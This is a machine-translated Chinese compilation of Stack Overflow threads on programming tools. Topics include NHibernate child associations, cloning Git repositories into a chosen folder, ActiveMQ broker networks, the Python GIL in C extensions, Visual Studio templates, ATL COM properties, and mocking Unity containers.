# nhibernate - NHibernate - 当我只有孩子 ID 时保存父母

> ID：651037
> 
> 赞同：2
> 
> 时间：2009-03-16T15:56:20.210
> 
> 标签：nhibernate

假设我有这样的课程：

```
public class Parent
{
   public int ParentId {get;set;}
   public IList<Child> Children {get;set;}
   public string Name {get;set;}
}

public class Child
{
   public int ChildId {get;set;}
} 
```

有人调用一个方法来保存一个新的父级并传递给我一个名称和一个子 ID 列表，我想保存父级。有没有一种方法可以保存父级并将子级 ID 与其关联，而无需加载子级对象然后将它们添加到子级集合中？加载对象似乎很浪费，以便在我已经拥有 ID 时让 NHibernate 保存它们，如果我在存储过程中这样做，这将是我保存父对象所需的全部内容。

使用... NHibernate 2.0.1GA，SQL Server 2005

乔恩

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-06-03T10:12:44.133

我认为这样的事情会起作用

```
var child1 = Session.Load<Child>(12);
var child2 =Session.Load<Child>(23);
var parent = Session.Get(253);
parent.Name = "new parent name";
parent.Children.Add(child1);
parent.Children.Add(child2); 
```

当调用 load 时，它在实际访问之前不会去数据库获取数据，所以我想这也可以为你解决问题。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T19:48:12.573

如果父级与子级相关联，那么每个子级中应该有一个父级属性（我没有看到），无论如何您都必须更新子级，因此您必须从数据库中加载所有子级.

否则，父母与孩子之间的关系如何持续存在？如果它不只是用 Name 属性保存父级，甚至不打扰子级。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2009-03-16T21:02:52.347

您可以将整数集合映射（即 Parent.Children 作为 IList<int>），也可以将对象集合映射（即 Parent.Children 作为 IList<Child>）。如果您映射对象，那么您必须使用对象更新数据库，即您需要加载子对象以保存父对象。如果您选择映射整数 ID，则可以通过 ID 进行更新。

PS。如果您的 ID 是其他一些原始类型（例如 guid、字符串等），那么同样的论点仍然适用。

# git - 如何将 Git 存储库克隆到特定文件夹中？

> ID：651038
> 
> 赞同：2709
> 
> 时间：2009-03-16T15:56:54.907
> 
> 标签：git, repository, git-clone

执行该命令`git clone git@github.com:whatever`会在我的当前文件夹中创建一个名为`whatever`的目录，并将 Git 存储库的内容放到该文件夹​​中：

```
/httpdocs/whatever/public 
```

我的问题是我需要将 Git 存储库的内容克隆到我的当前目录中，以便它们出现在 Web 服务器的正确位置：

```
/httpdocs/public 
```

我知道在克隆存储库后如何移动文件，但这似乎破坏了 Git，我希望能够通过调用`git pull`. 我怎样才能做到这一点？

* * *

## 回答 #1

> 赞同：3822
> 
> 时间：2009-03-16T16:08:24.707

**选项 A：**

```
git clone git@github.com:whatever folder-name 
```

因此，`right here`使用：

```
git clone git@github.com:whatever . 
```

**选项 B：**

也移动`.git`文件夹。请注意，该`.git`文件夹在大多数图形文件资源管理器中是隐藏的，因此请务必显示隐藏文件。

```
mv /where/it/is/right/now/* /where/I/want/it/
mv /where/it/is/right/now/.* /where/I/want/it/ 
```

第一行抓取所有普通文件，第二行抓取点文件。也可以通过启用 dotglob (ie `shopt -s dotglob`) 在一行中做到这一点，但如果您问这个答案回答的问题，这可能是一个糟糕的解决方案。

**更好的是：**

将您的工作副本保存在其他地方，并创建一个符号链接。像这样：

```
ln -s /where/it/is/right/now /the/path/I/want/to/use 
```

对于您的情况，这将类似于：

```
ln -sfn /opt/projectA/prod/public /httpdocs/public 
```

如果您愿意，可以轻松更改以进行测试，即：

```
ln -sfn /opt/projectA/test/public /httpdocs/public 
```

无需移动文件。添加`-fn`以防有人复制这些行（`-f`强制， `-n`避免与已经存在和不存在的链接进行一些经常不需要的交互）。

如果您只是想让它起作用，请使用选项 A，如果其他人要查看您所做的事情，请使用选项 C。

* * *

## 回答 #2

> 赞同：625
> 
> 时间：2010-02-25T17:15:14.663

我认为很多人问这个问题的例子就是这个。如果您*位于*要将 git 存储库的内容转储到的目录中，请运行：

```
git clone git@github.com:whatever . 
```

这 ”。” 最后将当前文件夹指定为结帐文件夹。

* * *

## 回答 #3

> 赞同：248
> 
> 时间：2013-12-12T08:43:17.073

进入文件夹..如果文件夹为空，则：

```
git clone git@github.com:whatever . 
```

别的

```
git init
git remote add origin PATH/TO/REPO
git fetch
git checkout -t origin/master 
```

* * *

## 回答 #4

> 赞同：106
> 
> 时间：2013-04-23T21:27:56.920

## 基本 Git 存储库克隆

您克隆一个存储库

```
git clone [url] 
```

例如，如果你想克隆名为 open_framework 的斯坦福大学 Drupal 开放框架 Git 库，你可以这样做：

```
$ git clone git://github.com/SU-SWS/open_framework.git 
```

这将创建一个名为 open_framework 的目录（在您当前的本地文件系统位置），在其中初始化一个 .git 目录，提取该存储库的所有数据，并签出最新版本的工作副本。如果您进入新创建的 open_framework 目录，您将在其中看到项目文件，准备好进行处理或使用。

## 将存储库克隆到特定的本地文件夹

如果要将存储库克隆到名为 open_framework 以外的目录中，可以将其指定为下一个命令行选项：

```
$ git clone git:github.com/SU-SWS/open_framework.git mynewtheme 
```

该命令与前一个命令执行相同的操作，但目标目录称为 mynewtheme。

Git 有许多不同的传输协议可供您使用。前面的示例使用 git:// 协议，但您也可能会看到 http(s):// 或 user@server:/path.git，它使用 SSH 传输协议。

* * *

## 回答 #5

> 赞同：52
> 
> 时间：2017-01-08T20:04:06.660

要将 git 存储库克隆到特定文件夹中，您可以使用`-C <path>`参数，例如

```
git -C /httpdocs clone git@github.com:whatever 
```

尽管它仍会`whatever`在其上创建一个文件夹，但要将存储库的内容克隆到当前目录，请使用以下语法：

```
cd /httpdocs
git clone git@github.com:whatever . 
```

^(请注意，仅当目录为**空****时才**允许克隆到现有目录。)

 **由于您正在克隆到可供公众访问的文件夹，因此请考虑通过在 Web 服务器配置中使用`--separate-git-dir=<git dir>`或排除文件夹（例如，在文件中）将您的 Git 存储库与工作树分开。`.git``.htaccess`

* * *

## 回答 #6

> 赞同：30
> 
> 时间：2017-03-21T16:03:51.180

克隆到*当前工作目录*：

```
git clone https://github.com/link.git 
```

克隆到*另一个目录*：

```
git clone https://github.com/link.git ./Folder1/Folder2 
```

希望能帮助到你 ：）

* * *

## 回答 #7

> 赞同：25
> 
> 时间：2020-05-13T06:24:11.093

您可以使用以下 git 命令使用自定义目录名称进行克隆

```
git clone <git_repo_url> <your_custom_directory_name> 
```

**注意：**您不需要创建**自定义目录**，因为它会自动创建

* * *

## 回答 #8

> 赞同：18
> 
> 时间：2016-09-11T00:59:08.380

如果你想克隆到当前文件夹，你应该试试这个：

```
git clone https://github.com/example/example.git ./ 
```

* * *

## 回答 #9

> 赞同：17
> 
> 时间：2009-03-16T16:14:48.887

当您将文件移动到您想要的位置时，您是否也在移动`.git`目录？根据您的操作系统和配置，此目录可能会被隐藏。

它包含 repo 和支持文件，而您`/public`目录中的项目文件只是当前签出提交中的版本（默认为 master 分支）。

* * *

## 回答 #10

> 赞同：16
> 
> 时间：2015-06-26T11:42:09.477

**用法**

```
git clone <repository> 
```

将位于 <repository> 的存储库克隆到本地计算机上。原始存储库可以位于本地文件系统或可通过 HTTP 或 SSH 访问的远程计算机上。

```
git clone <repo> <directory> 
```

将位于 <repository> 的存储库克隆到本地计算机上名为 <directory> 的文件夹中。

来源：*[设置存储库](https://www.atlassian.com/git/tutorials/setting-up-a-repository/git-clone)*

* * *

## 回答 #11

> 赞同：15
> 
> 时间：2013-04-04T06:46:46.003

克隆：

```
git clone git@jittre.unfuddle.com:jittre/name.git 
```

克隆“特定分支”：

```
git clone -b [branch-name] git@jittre.unfuddle.com:jittre/name.git 
```

* * *

## 回答 #12

> 赞同：12
> 
> 时间：2011-02-25T22:17:12.180

如果您尝试将内容检出到当前目录，请确保删除 .git 存储库。

`rm -rf .git`然后`git clone https://github.com/symfony/symfony-sandbox.git`

* * *

## 回答 #13

> 赞同：7
> 
> 时间：2019-01-30T16:04:01.857

由于某种原因，这种语法并不突出：

### `git clone repo-url [folder]`

这里的文件夹是本地文件夹（将是本地存储库）的可选路径。

Git`clone`还将`pull`从远程存储库编码到本地存储库。事实上这是真的：

```
git clone repo-url  =  git init + git remote add origin repo-url + git pull 
```

* * *

## 回答 #14

> 赞同：5
> 
> 时间：2016-02-28T04:46:25.980

这是我的做法，但我已经为我做了一个别名。

```
$ cd ~Downloads/git; git clone https:git.foo/poo.git 
```

可能有一种更优雅的方法可以做到这一点，但是我发现这对我自己来说是最简单的。

这是我为加快速度而创建的别名。我为 zsh 制作了它，但它应该适用于 bash 或任何其他 shell，如 fish、xyzsh、fizsh 等。

用你最喜欢的编辑器编辑`~/.zshrc`，`/.bashrc`等等（我的是 Leafpad，所以我会写`$ leafpad ~/.zshrc`）。

然而，我个人的偏好是制作一个 zsh 插件来跟踪我所有的别名。您可以通过运行以下命令为 oh-my-zsh 创建个人插件：

```
$ cd ~/.oh-my-zsh/
$ cd plugins/
$ mkdir your-aliases-folder-name; cd your-aliases-folder-name
     # In my case '~/.oh-my-zsh/plugins/ev-aliases/ev-aliases'
$ leafpad your-zsh-aliases.plugin.zsh
     # Again, in my case 'ev-aliases.plugin.zsh' 
```

然后，将这些行添加到新创建的空白 Alises.plugin 文件中：

```
# Git aliases
alias gc="cd ~/Downloads/git; git clone " 
```

（从这里，用我的名字替换你的名字。）

然后，为了让别名起作用，它们（连同 zsh）必须是 source-in 的（或任何它被称为的）。为此，在您的自定义插件文档中添加以下内容：

```
## Ev's Aliases

#### Remember to re-source zsh after making any changes with these commands:

#### These commands should also work, assuming ev-aliases have already been sourced before:

allsource="source $ZSH/oh-my-zsh.sh ; source /home/ev/.oh-my-zsh/plugins/ev-aliases/ev-aliases.plugin.zsh; clear"
sourceall="source $ZSH/oh-my-zsh.sh ; source /home/ev/.oh-my-zsh/plugins/ev-aliases/ev-aliases.plugin.zsh"
#### 

####################################

# git aliases

alias gc="cd ~/Downloads/git; git clone "
# alias gc="git clone "
# alias gc="cd /your/git/folder/or/whatever; git clone "

#################################### 
```

保存您的 oh-my-zsh 插件，然后运行`allsource`​​. 如果这似乎不起作用，只需运行`source $ZSH/oh-my-zsh.sh; source /home/ev/.oh-my-zsh/plugins/ev-aliases/ev-aliases.plugin.zsh`. 这将加载允许您`allsource`从现在开始使用的插件源。

* * *

我正在使用我的所有别名创建一个 Git 存储库。请随时在此处查看它们：[Ev 的点文件](https://github.com/koesherbacon/Dot-Files)。请随意分叉和改进它们以满足您的需求。

* * *

## 回答 #15

> 赞同：4
> 
> 时间：2020-11-19T18:06:31.103

如果您位于要将 git 存储库的内容转储到的目录中，请运行：

```
git clone git@github.com:origin . 
```

这 ”。” 最后将当前文件夹指定为结帐文件夹。

* * *

## 回答 #16

> 赞同：3
> 
> 时间：2017-03-27T07:36:06.677

如果您正在使用`ssh`for`git cloning`您可以使用以下命令。

`git -C path clone git@github.com:path_to_repo.git`

例如： `git -C /home/ubuntu/ clone git@github.com:kennethreitz/requests.git`将 git 存储库拉`requests`到您的`/home/ubuntu/`路径。

* * *

## 回答 #17

> 赞同：0
> 
> 时间：2019-08-30T06:29:15.750

尽管上面的所有答案都很好，但我想提出一种新方法，而不是使用公共 html 目录中的符号链接方法，如已接受答案中建议的 BEST 。您需要有权访问您的服务器虚拟主机配置。

它是关于配置直接指向存储库目录的 Web 服务器的虚拟主机。在 Apache 中，你可以这样做：

> DocumentRoot /var/www/html/website/your-git-repo

这是一个虚拟主机文件的示例：

```
<VirtualHost *:443>
    ServerName example.com

    DocumentRoot /path/to/your-git-repo
    ...
    ...
    ...
    ...
</VirtualHost> 
```

* * *

## 回答 #18

> 赞同：-1
> 
> 时间：2018-10-24T13:25:22.790

```
For Windows user 

1> Open command prompt.
2> Change the directory to destination folder (Where you want to store your project in local machine.)
3> Now go to project setting online(From where you want to clone)
4> Click on clone, and copy the clone command.
5> Now enter the same on cmd .

It will start cloning saving on the selected folder you given . 
```

* * *

## 回答 #19

> 赞同：-5
> 
> 时间：2013-05-06T02:16:22.157

关于原帖中的这一行：

> “我知道如何在克隆 repo 后移动文件，但这似乎破坏了 git”

我能够做到这一点，到目前为止，我的添加、提交、推送、拉取操作没有发现任何问题。

这种方法如上所述，但没有分解成步骤。以下是对我有用的步骤：

1.  将 repo 克隆到任何新的临时文件夹中
2.  cd 进入您刚刚在本地克隆的根文件夹
3.  将文件夹的全部内容（包括 /.git 目录）复制到您喜欢的任何现有文件夹中；（比如说一个你想与你的仓库合并的 Eclipse 项目）

您刚刚将文件复制到的现有文件夹现在已准备好与 git 交互。

# messaging - ActiveMQ 消息分发

> ID：651039
> 
> 赞同：2
> 
> 时间：2009-03-16T15:56:57.120
> 
> 标签：messaging, activemq

我有几台从 Python 生成 xml 文件的服务器和一些使用 Java 使用这些 xml 的其他服务器。我最近才研究 JMS 和[ActiveMQ](http://activemq.apache.org/)并决定尝试使用它来传递 xml 文件。

所以我在消费者服务器上设置了 ActiveMQ 守护进程，并认为我会在产品上实现一些循环方法，以便将 xml 均匀地分布在消费者之间。

```
Python  -----------------------------> ActiveMQ ---> Java
        \                           /
         \                         /
          ---------------------------> ActiveMQ ---> Java
                                 /  /
Python  ---------------------------- 
```

为了测试，我运行了一个生产者和一个消费者并查看了结果。

令我惊讶的是，来自生产者的消息分布在网络上的所有 ActiveMQ 服务器上。由于我只运行了一个消费者，它只接收到该机器上的 ActiveMQ 守护程序的 xml，其余的 xml 正在其他机器上的其他 ActiveMQ 守护程序上耐心等待。

```
Python  -----------------------------> ActiveMQ ---> Java (work)
                                          |
                                          |
                                       ActiveMQ (xmls piling up) 
```

**编辑：这不是实际发生的事情，对不起。详情见下文**

现在，我没有抱怨，因为无论如何这就是我想要的，但我有点困惑：实现我所追求的这个多对多队列的正确方法是什么？

我是否也应该在我的生产者机器上设置 ActiveMQ 守护程序，将 xmls 发送到 localhost ActiveMQs 并信任自动发现以将 xmls 发送给消费者？

```
Python ---> ActiveMQ ------------------------------ ActiveMQ ---> Java
                |                                      |
                |                                      |
                |                                -- ActiveMQ ---> Java
                |                               |  
Python ---> ActiveMQ---------------------------- 
```

为了安全起见，我应该坚持我原来的计划，并在消费者机器上循环消息吗？

或者是否有一个我应该使用的 API 来隐藏我的流程中的这些细节？

顺便说一句，生产者是使用 STOMP 的 python 进程，消费者是使用 JMS 的 java。

如果你的眼睛因我蹩脚的 ASCII 艺术而受伤，我深表歉意，我不确定我是否只用文字就足够清楚了。

## 编辑

显然，当我运行“一个生产者和一个消费者”时，我没有注意到其他消费者已经在运行。他们只是没有对他们处理的 xml 做任何有用的事情。这就是我看到部分结果的原因。

在阅读了更多内容并进行了一些实验之后，我发现了以下内容：

默认情况下，ActiveMQ 会自动发现本地网络上的其他 ActiveMQ 实例，并创建一个存储转发[网络的 brokers](http://activemq.apache.org/networks-of-brokers.html)。这意味着生产者可以将 xmls 发布到任何 ActiveMQ 实例，他们将找到自己的方式让消费者在同一网络上侦听其他 ActiveMQ 实例。

请注意，文档声称不建议将自动发现用于生产设置。

不过，下面接受的答案仍然适用。使用 ActiveMQ 最简单的方法就是使用一两个服务器作为“队列服务器”。尽管如此，我还是选择了我最初的计划，因为我*认为*它会减少网络流量（使用中间服务器，xmls 必须进入它并再次退出它）。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2009-03-23T14:13:20.527

Itsadok，我认为您可能没有考虑正确使用消息传递。

在每个消费者的情况下拥有一个 MOM 实例（无论是 ActiveMQ、RabbitMQ 还是任何其他 MOM 代理）在概念上并没有真正意义。相反，最好将您的 MOM 代理视为消息路由器。

在这种情况下，您将拥有一个所有生产者和所有消费者都连接到的 ActiveMQ 代理实例（如果您遇到扩展问题，可能会被分片或以其他方式扩展，或者如果您有 HA 考虑，则可能会被复制）。然后所有 XML 都转到同一个代理实例，所有消费者都从同一个代理实例读取。在这种情况下，代理将根据它使用的任何启发式方法来确定消息应该发送给哪个消费者。

这也意味着您可以动态添加和删除生产者和消费者，并且不会发生任何变化：它们都连接到相同的代理，因此您可以在负载变化或系统故障时添加和删除生产者和消费者。

# c++ - 并发：用 C/C++ 编写的 Python 扩展是否受全局解释器锁的影响？

> ID：651048
> 
> 赞同：26
> 
> 时间：2009-03-16T16:00:10.623
> 
> 标签：c++, python, c, multithreading

Python 的强项之一是易于编写 C 和 C++ 扩展以加速代码的处理器密集型部分。这些扩展可以避免 Global Interpreter Lock 还是它们也受到 GIL 的限制？如果不是，那么这个“易于扩展”比我之前意识到的更具有杀手锏。我怀疑答案不是简单的是或否，但我不确定，所以我在 StackOverflow 上问这个问题。

* * *

## 回答 #1

> 赞同：23
> 
> 时间：2009-03-16T16:51:08.770

是的，对 C 扩展的调用（从 Python 调用的 C 例程）仍然受制于 GIL。

但是，您可以在 C 扩展中*手动*释放 GIL，只要在将控制权返回给 Python VM 之前小心地重新声明它即可。

有关信息，请查看`Py_BEGIN_ALLOW_THREADS`和`Py_END_ALLOW_THREADS`宏：[http ://docs.python.org/c-api/init.html#thread-state-and-the-global-interpreter-lock](http://docs.python.org/c-api/init.html#thread-state-and-the-global-interpreter-lock)

* * *

## 回答 #2

> 赞同：8
> 
> 时间：2009-03-16T16:08:21.663

Python 的 C/C++ 扩展不受 GIL 约束。但是，您确实需要知道自己在做什么。 [从 http://docs.python.org/c-api/init.html](http://docs.python.org/c-api/init.html)：

> 全局解释器锁用于保护指向当前线程状态的指针。释放锁并保存线程状态时，必须在释放锁之前检索当前线程状态指针（因为另一个线程可以立即获取锁并将自己的线程状态存储在全局变量中）。反之，在获取锁和恢复线程状态时，必须先获取锁，然后再存储线程状态指针。
> 
> 为什么我要讲这么多细节？因为从 C 创建线程时，它们没有全局解释器锁，也没有线程状态数据结构。这样的线程必须通过首先创建线程状态数据结构，然后获取锁，最后存储它们的线程状态指针来引导自己存在，然后才能开始使用 Python/C API。完成后，他们应该重置线程状态指针，释放锁，最后释放他们的线程状态数据结构。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-04-09T07:17:20.427

查看 Cython，它具有与 Python 相似的语法，但具有一些结构，例如“cdef”、快速 numpy 访问函数和“with nogil”语句（按照它的意思执行）。

* * *

## 回答 #4

> 赞同：1
> 
> 时间：2016-04-08T03:29:57.780

如果您使用 C++ 编写扩展，则可以使用 RAII 轻松、清晰地编写操作 GIL 的代码。我使用这对 RAII 结构：

```
namespace py {

    namespace gil {

        struct release {
            PyThreadState* state;
            bool active;

            release()
                :state(PyEval_SaveThread()), active(true)
                {}

            ~release() { if (active) { restore(); } }

            void restore() {
                PyEval_RestoreThread(state);
                active = false;
            }
        };

        struct ensure {
            PyGILState_STATE* state;
            bool active;

            ensure()
                :state(PyGILState_Ensure()), active(true)
                {}

            ~ensure() { if (active) { restore(); } }

            void restore() {
                PyGILState_Release(state);
                active = false;
            }
        };

    }

} 
```

... 允许为给定的块切换 GIL（以任何上下文管理器 Pythonista 粉丝似乎都不太熟悉的语义方式）：

```
PyObject* YourPythonExtensionFunction(PyObject* self, PyObject* args) {

    Py_SomeCAPICall(…);     /// generally, if it starts with Py* it needs the GIL
    Py_SomeOtherCall(…);    /// ... there are exceptions, see the docs

    {
        py::gil::release nogil;
        std::cout << "Faster and less block-y I/O" << std::endl
                  << "can run inside this block -" << std::endl
                  << "unimpeded by the GIL";
    }

    Py_EvenMoreAPICallsForWhichTheGILMustBeInPlace(…);

} 
```

…确实，我个人也发现扩展 Python 的便利性，以及对内部结构和状态的控制级别，这是一个杀手级功能。

# python - 一个支持 SSL 的简单 Python IRC 客户端库？

> ID：651053
> 
> 赞同：5
> 
> 时间：2009-03-16T16:01:01.823
> 
> 标签：python, irc

一个支持 SSL 的简单 Python IRC 客户端库？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2009-03-16T16:12:07.723

[Twisted](http://twistedmatrix.com/trac/wiki/TwistedWords)有一个 IRC 客户端（在 twisted.words 中），它支持 SSL。

文档中有一个[例子](http://twistedmatrix.com/projects/words/documentation/examples/ircLogBot.py)，只记得做`reactor.connectSSL`而不是`reactor.connectTCP`。

如果您不想要 Twisted，还有[Python IRC 库](http://python-irclib.sourceforge.net/)，我注意到它在最新版本中支持 SSL。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2009-03-16T16:15:58.730

多么简单？Chatzilla 支持 SSL，并且与任何 Mozilla 平台应用程序一样，允许使用 Python。[https://developer.mozilla.org/En/Python](https://developer.mozilla.org/En/Python)

再想一想，这可能完全是矫枉过正。阿里的回答一秒钟，Twisted 就可以了。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2014-05-31T10:16:41.383

irc3 支持 ssl（通过 asyncio）[https://irc3.readthedocs.org/](https://irc3.readthedocs.org/)

# svn - Netbeans颠覆表单错误

> ID：651054
> 
> 赞同：0
> 
> 时间：2009-03-16T16:01:03.460
> 
> 标签：svn, forms, matisse, netbeans6.1

好吧，当我从颠覆中回滚 .form 文件时，我认为出现了一个问题。NB 6.1 可以打开 .form 但是当我尝试保存文件时，IDE 会抛出内存不足异常。

在 NB 6.5 中，我可以打开并保存文件，但 IDE 的行为非常奇怪：每 1 分钟左右冻结 20 秒，然后解冻。

好的，如果有人知道我在说什么请帮助。我认为问题是从损坏的 .form 文件开始的，但是所有 IDE 都冻结很奇怪

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2009-03-17T13:23:02.553

好的，我认为答案是获得更多的内存或尝试释放一些内存以使 netbeans 稳定。当然，当内存处于极限时会出现一些非常奇怪的行为。所以尽量不要自己去寻找

# visual-studio - 新 C# 文件中的默认 using 指令

> ID：651055
> 
> 赞同：19
> 
> 时间：2009-03-16T16:01:04.007
> 
> 标签：visual-studio, default, using-directives

为什么 Visual Studio 2008 会自动将以下*using 指令*插入到我创建的每个新 C# 文件中？

```
using System; 
using System.Collections.Generic; 
using System.Text; 
```

这些命名空间有什么特别之处？这些是最常用的吗？

* * *

## 回答 #1

> 赞同：35
> 
> 时间：2009-03-16T16:03:04.283

是的，它们经常被使用，仅此而已，所以 MS 将它们放在[Visual Studio 模板](http://msdn.microsoft.com/en-us/library/6db0hwky.aspx)中。就我个人而言，我经常使用“排序和删除未使用的使用”，所以它们经常消失。

如果要删除它们，可以[修改“新类”模板](https://stackoverflow.com/questions/2072687/how-do-i-edit-the-visual-studio-templates-for-new-c-sharp-class-interface)。

编辑：如果您成为“使用指令排序和删除未使用的指令”的粉丝，您应该掌握[Visual Studio 的 PowerCommands](http://visualstudiogallery.msdn.microsoft.com/e5f41ad9-4edc-4912-bca3-91147db95b99/) - 它添加了一个解决方案资源管理器上下文菜单项来为整个项目执行此操作，而不仅仅是一个文件 :)

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-16T16:04:05.857

如果你愿意，你可以改变它们。请参阅[此处](http://blogs.msdn.com/steve/archive/2007/04/10/changing-the-default-using-directives-in-visual-studio.aspx)了解更多信息。

**--- 以下是链接停止时文章的主要部分。---**

如果您打开`%Program Files%\Microsoft Visual Studio 8\Common7\IDE\ItemTemplates\CSharp\1033\Class.zip`，您可以修改其中`class.cs`用于生成所有新 C# 源文件的文件 - 它看起来像这样：

```
using System;
using System.Collections.Generic;
using System.Text;

namespace $rootnamespace$
{
    class $safeitemrootname$
    {
    }
} 
```

然后，您可以在此文件顶部添加或删除所需的*using指令，并将其保存回存档。*最后运行`%Program Files%\Microsoft Visual Studio 8\Common7\IDE\devenv.exe /setup`刷新Visual Studio的模板缓存。现在，您创建的所有新 C# 文件都应与修改后的模板匹配。

* * *

## 回答 #3

> 赞同：2
> 
> 时间：2009-03-16T16:13:03.540

那是在特定类型的项目中被选为新文件模板中的命名空间。不同类型的项目有不同的模板，因此有不同的 using 指令集。使用指令只是根据该类型文件所需的内容以及您可能使用的内容来选择。

using 指令只告诉编译器在哪里查找类，因此使用代码不需要的 using 指令没有害处，只要它们不会引起任何冲突（类名不明确）。

如果您右键单击文件并打开`Organise Usings`子菜单，您会找到`Remove Unused Usings`可用于删除文件中不需要的 using 指令的选项。

# c++ - 在 ATL 中将对象作为属性返回

> ID：651060
> 
> 赞同：1
> 
> 时间：2009-03-16T16:02:37.793
> 
> 标签：c++, atl

我正在使用 Visual Studio 2008 和 ATL 创建一个 COM 对象。添加简单的属性和方法很容易，但现在我想做一些更复杂的事情。我想通过我的 COM 对象的属性授予对 C++ 对象的访问权限，因此我可以执行以下操作：

```
// Pseudo-code
var obj = CreateObject("progid");
obj.aProperty.anotherProperty = someValue; 
```

因此，`aProperty`返回对另一个对象的引用，该对象公开了一个名为`anotherProperty`.

我猜我需要在我的项目中为第二个对象添加另一个简单的 ATL 对象（调用它`IClass2`），并且在 IDL 中有类似以下内容：

```
[propget, id(1)] HRESULT aProperty([out, retval] IClass2** ppValue); 
```

我在正确的轨道上吗？有谁知道这类事情的好教程？

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2009-03-16T16:54:57.480

如果要从自动化语言中调用它，则需要从 IDispatch 派生返回的接口，并且您可能需要至少将其作为 IDispatch** 返回。对于 retval，我认为这已经足够了；对于简单的 [out] 参数，您需要将其作为 VARIANT*（变量类型设置为 VT_LPDISPATCH）传递，以便自动化语言可以理解它。

我不确定是否有好的教程；自从我寻找全面的参考资料以来已经有一段时间了。我能给出的最好建议是确保您传递的所有内容都是自动化兼容的（例如：是一种可以放入 VARIANT 的类型），这应该可以解决 80% 的问题。不过，这是非常可行的；只是在 MSDN 上阅读，你应该没问题。

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2009-03-17T07:47:39.567

我刚看到这篇文章：

[HOWTO：在 ATL 中实现静态对象层次结构](http://vcfaq.mvps.org/com/12.htm)

这看起来与我想要实现的目标非常相似。

# c# - 你如何模拟 IUnityContainer？

> ID：651073
> 
> 赞同：5
> 
> 时间：2009-03-16T16:05:54.620
> 
> 标签：c#, tdd, mocking, moq, unity-container

我正在尝试使用 Moq 3.0 模拟 IUnityContainer

我得到一个 BadImageFormatException，但在调试时没有。从外观上看，我不是唯一遇到这个问题的人。

[这里](http://www.nabble.com/BadImageFormatException,-but-not-when-debugging-td18742529.html)

它是 Moq 的注册问题

[这里](http://code.google.com/p/moq/issues/detail?id=87)

我只是好奇是否有人找到了解决方案...我发现的最接近的是使用 Roy Osherove 的 RhinoMock 的一个不错的解决方案

[这里](http://weblogs.asp.net/rosherove/archive/2008/04/14/creating-a-automockingcontainer-with-microsoft-unity-pretty-darn-simple.aspx)

但我真的很喜欢起订量！所以我真的不想切换到 Rhino Mock 但如果必须的话我会的

提前致谢！

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2011-09-16T04:16:32.833

你没有。

模拟容器的唯一原因是您是否正在传递它。这是一种反模式。

[相反，您希望在应用程序的入口点或Composition Root](http://blog.ploeh.dk/2011/07/28/CompositionRoot/)处组合整个对象图。

如果您需要动态创建实例，请使用[Automatic Factories](https://www.devtrends.co.uk/blog/using-unitys-automatic-factories-to-lazy-load-expensive-dependencies)。

对于您的测试，您可以构造被测对象并将模拟对象传递给构造函数，或者在测试中创建一个新容器并使用它注册模拟对象。

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2009-03-23T22:59:56.127

你需要一个成熟的模拟对象吗？你能简单地实现一个假货吗？即，实现 IUnityContainer 接口的测试实例化并覆盖您需要与之交互的方法？

我不止一次落入陷阱，因为我有一个模拟对象库，我应该用它来隔离系统中的每个依赖项。通常情况下，做一些简单的事情会让我得到我想要的结果，而挫败感要低得多。

* * *

## 回答 #3

> 赞同：1
> 
> 时间：2009-11-09T14:05:58.907

您是否尝试过模拟 UnityBaseContainer 或 UnityContainer 而不是 IUnityContainer，比如Rory Primrose 的[这篇文章？](http://www.neovolve.com/post/2009/08/07/Mocking-IUnityContainer-and-avoiding-BadImageFormatException.aspx)他正在处理 RhinoMocks 但因为我认为这个问题与 Moq 对 Castle 的内部使用有关，你也许可以通过这种方式解决问题。

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2009-11-08T13:41:05.043

由于这个问题我不模拟`IUnityContainer`，我使用一个真实的实例来`UnityContainer`代替。这并不理想，但我可以通过检查容器是否可以适当地解析类型来测试注册。

当您使用它来解析类中的类型时，您可以模拟和使用`IServiceLocator`，或者更好的是，使用在容器中注册工厂并使用它。

* * *

## 回答 #5

> 赞同：0
> 
> 时间：2011-09-18T08:28:42.080

你是在 Win x64 上运行这个吗？看看这个[页面](http://msdn.microsoft.com/en-us/library/system.badimageformatexception.aspx)。它清楚地表明。

> ***当动态链接库（.dll 文件）或可执行文件（.exe 文件）的文件格式不符合公共语言运行库预期的格式时，将引发此异常。***

此外，发现此博客条目建议将编译标志从 Any CPU 更改为 x86 可能有助于解决这个问题。[http://filips.net/archives/2008/01/17/getting-badimageformatexception-in-64-bit-windows/](http://filips.net/archives/2008/01/17/getting-badimageformatexception-in-64-bit-windows/)

**编辑：**

也看看[这个](https://stackoverflow.com/questions/2023766/an-attempt-was-made-to-load-a-program-with-an-incorrect-format-even-when-the-pl)SO 线程。看看你的构建配置管理器。

# msbuild - 是否可以在 MSBuild 项目之间传递属性？

> ID：651077
> 
> 赞同：4
> 
> 时间：2009-03-16T16:06:47.097
> 
> 标签：msbuild

是否可以将属性从一个 msbuild 项目传递到另一个？因此，在一个 .proj 文件中有一个 PropertyName="Foo" 的属性（例如）。我们可以从另一个 .proj 文件访问它，即在另一个 msbuild 项目中使用“$(Foo)”吗？

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2009-03-16T16:11:13.450

一种方法是在调用下一个脚本时传递属性，例如

```
<MSBuild Projects="another.proj" Properties="PropertyName=$(Foo)" /> 
```

* * *

## 回答 #2

> 赞同：4
> 
> 时间：2009-03-16T16:17:04.123

通过在要使用该属性的文件中使用[Import 元素。](http://msdn.microsoft.com/fr-fr/library/92x05xfs.aspx)

```
<Import Project="ProjectPath"/> 
```

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-08-22T17:14:31.470

尝试使用**$(MSBuildArguments)**变量。我知道它在 TFS 中有效，但我不确定它是否在命令提示符下有效。

